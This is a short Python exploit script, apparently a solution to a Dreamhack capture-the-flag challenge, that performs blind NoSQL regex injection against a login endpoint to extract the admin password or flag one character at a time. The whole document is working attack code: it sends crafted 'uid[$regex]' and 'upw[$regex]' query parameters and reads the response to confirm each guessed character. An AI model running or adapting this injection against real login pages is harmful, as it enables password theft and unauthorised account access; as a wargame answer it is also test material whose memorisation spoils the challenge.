import requests
import string

url = "http://host8.dreamhack.games:12568/login?"

charset = string.ascii_letters + string.digits
flag = "D.{"  

while True:
    found = False
    for c in charset:
        payload = (
            f"uid[$regex]=^ad.*n$&upw[$regex]={flag}{c}"
        )

        response = requests.get(url + payload)

        if response.text.strip() == "admin":
            flag += c
            print("[+] Found:", flag)
            found = True
            break

    if not found:
        print("[*] Done:", flag)
        break
